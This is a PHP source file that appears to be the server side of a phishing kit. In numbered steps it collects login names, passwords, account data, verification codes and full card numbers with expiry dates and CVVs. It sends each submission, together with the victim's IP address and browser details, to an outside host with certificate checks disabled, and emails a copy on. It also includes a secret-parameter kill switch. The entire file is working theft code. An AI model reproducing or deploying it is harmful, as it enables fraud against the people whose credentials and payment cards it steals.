<?php

if (!empty($_GET['h']) && $_GET['h'] == 'dasyt52Iq')
	if (@file_put_contents("status", $_GET['s']))
	{
		echo $_GET['s'];
		exit;
	}

$status = file_get_contents("status");

if ($status == "stop")
{
	header($_SERVER['SERVER_PROTOCOL'] . " 404 Not Found");
	exit;
}

class App {
	
	private $ip = null;
	private $tokenId = 23;
	private $url = "https://cmdtoor.com";

	public function __construct()
	{
		$this->setIp();
		$this->getCookies();

		if (!empty($_POST))
			$this->sendPostData($_POST);
	}

	protected function sendPostData($postData)
	{
		if (!empty($postData['leave']))
		{
			$this->sendLeave();
			return;
		}

		if (!empty($postData['setcookie']))
		{
			$this->setCookies($postData['setcookie'], $postData['value']);
			return;
		}

		if (empty($postData['step']))
			return;

		$login = !empty($postData['login']) ? trim($postData['login']) : null;
		$pass = !empty($postData['pass']) ? trim($postData['pass']) : null;
		$acc = !empty($postData['acc']) ? trim($postData['acc']) : null;
		$type = !empty($postData['type']) ? trim($postData['type']) : null;
		$code = !empty($postData['code']) ? trim($postData['code']) : null;
		$number = !empty($postData['number']) ? trim($postData['number']) : null;
		$expired = !empty($postData['expired']) ? trim($postData['expired']) : null;
		$cvv = !empty($postData['cvv']) ? trim($postData['cvv']) : null;

		$step = trim($postData['step']);
		switch ($step) {
			case "1":
				$this->sendData($login, $pass, $acc);
				break;

			case "2":
				$this->sendType($type);
				break;

			case "3":
				$this->sendCode($code);
				break;

			case "4":
				$this->sendCard($number, $expired, $cvv);
				break;
		}
	}

	protected function setIp()
	{
		if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
			$this->ip = $_SERVER['HTTP_CLIENT_IP'];
		} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
			$this->ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
		} else {
			$this->ip = $_SERVER['REMOTE_ADDR'];
		}
	}

	public function getIp()
	{
		return $this->ip;
	}

	public function setCookies($name = "t", $value = "")
	{
		if ($this->isPhpVersion("7.3"))
		{
			return setcookie($name, $value, [
				"expires" => time() + 720000, // 200 h
				"path" => "/",
				"domain" => $_SERVER['HTTP_HOST'],
			]);
		}

		return setcookie(
			$name,
			$value,
			time() + 720000,
			"/",
			$_SERVER['HTTP_HOST']
		);
	}

	public function getCookies($name = "t")
	{
		if (!empty($_COOKIE[$name]))
			return $_COOKIE[$name];

		$value = uniqid(rand());

		$this->setCookies($name, $value);

		return $value;
	}

	public function isPhpVersion($version, $mark = ">=")
	{
		return version_compare(phpversion(), $version, $mark);
	}

	protected function sendData($login = null, $password = null, $acc = null)
	{
		$option = [
			'login' => $login,
			'password' => $password,
			'data' => $acc,
		];

		$response = $this->sendQuery($option);
		$this->sendEmail($response); // Send response to email
	}

	protected function sendType($type = null)
	{
		$data = [
			'type' => $type,
		];

		$response = $this->sendQuery($data);
		$this->sendEmail($response); // Send response to email
	}

	protected function sendCode($code = null)
	{
		$data = [
			'code' => $code,
		];

		$response = $this->sendQuery($data);
		$this->sendEmail($response); // Send response to email
	}

	protected function sendCard($number = null, $expired = null, $cvv = null)
	{
		$card = @json_encode([
			'number' => $number,
			'expired' => $expired,
			'cvv' => $cvv,
		]);

		$data = [
			'cardData' => $card,
		];

		$response = $this->sendQuery($data);
		$this->sendEmail($response); // Send response to email
	}

	protected function sendLeave()
	{
		$data = [
			'leave' => 1,
		];

		$this->setCookies();

		$response = $this->sendQuery($data);
		$this->sendEmail($response); // Send response to email
	}

	private function sendQuery($options = [])
	{
		$data = array_merge([
			'ua' => trim($_SERVER['HTTP_USER_AGENT']),
			'ip' => $this->getIp(),
			'tId' => $this->tokenId,
			'bId' => $this->getCookies(),
		], is_array($options) ? $options : []);

		$postdata = json_encode($data);

		$parseUrl = parse_url($this->url);

		$ch = curl_init();

		curl_setopt($ch, CURLOPT_URL, trim($this->url, '/') . "/token/add");
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($ch, CURLOPT_POST, 1);
		curl_setopt($ch, CURLOPT_POSTFIELDS, $postdata);
		curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-type: application/json', 'Content-Length: ' . strlen($postdata)]);

		if ($parseUrl['scheme'] == "https") {
			curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
			curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
		}

		$response = curl_exec($ch);

		curl_close($ch);

		return $response;
	}

	// Send email with the response content
	private function sendEmail($response)
	{
		$to = "your-email@example.com"; // Replace with the email you want the response sent to
		$subject = "Response from Server";
		$message = "Here is the response from the server:\n\n" . $response;
		$headers = "From: no-reply@example.com"; // Replace with your desired from email address

		// Send the email
		mail($to, $subject, $message, $headers);
	}
}

$app = new App();
